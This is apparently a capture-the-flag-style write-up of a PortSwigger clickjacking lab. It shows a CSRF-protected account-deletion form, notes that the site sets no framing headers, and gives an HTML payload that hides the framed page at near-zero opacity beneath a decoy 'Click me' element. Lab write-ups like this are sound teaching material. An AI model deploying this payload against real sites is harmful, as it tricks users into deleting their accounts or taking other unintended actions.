## LAB DESCRIPTION

<img width="930" height="530" alt="image" src="https://github.com/user-attachments/assets/1a39349f-51a2-4dbf-acd9-8aa50464c8e1" />

## SOLUTION

---------------------------------------------

- Reference: https://portswigger.net/web-security/clickjacking

---------------------------------------------

- Login as the provided user `wiener:peter` and go to `/my-account`, and locate the **Delete account** button.

  <img width="1342" height="613" alt="image" src="https://github.com/user-attachments/assets/60ccd547-b00b-4f51-8e91-4d1abfd8c8a5" />

- In the browser dev tools -> Network, observe that clicking **Delete account** sends a POST containing a CSRF token, confirming server-side CSRF protection.

  <img width="1920" height="1152" alt="image" src="https://github.com/user-attachments/assets/fd03ad88-b066-451f-b837-0709d8e5f9e4" />

Inspecting the HTML around the delete function reveals a simple form:

```html
<form id=delete-account-form action="/my-account/delete" method="POST">
    <input required type="hidden" name="csrf" value="2vTVGt495cnWyg7J4zc9vkP7PhBAN4oH">
    <button class="button" type="submit">Delete account</button>
</form>
```
The request is a `POST` to `/my-account/delete`.
A CSRF token is included as a hidden field and validated server-side.

This prevents a straightforward cross-site `POST` CSRF, because an attacker cannot know or predict the victim's CSRF token.

> The response for `/my-account` has **no** `X-Frame-Options` header.
> There is no CSP `frame-ancestors` directive.

This means that the page can be embedded in an `<iframe>` on an attacker-controlled domain, which is a prerequisite for clickjacking.

-----------------------------------------------

## Crafting the malicious HTML

To stack elements visually, the CSS `position` and `z-index` properties can contorl order, and `opacity` can be used to hide the real page.

```html
<style>
	iframe {
		position: relative;
		width: 1000px;
		height: 700px;
		opacity: 0.000001;
		z-index: 2;
	}

	div {
		position: absolute;
		top: 515px;
		left: 60px;
		z-index: 1;

</style>

<div>Click me</div>
<iframe src="https://0a9e00a903c7b4a280382bf30066006f.web-security-academy.net/my-account?id=wiener"></iframe>
```

----------------------------------------------------------
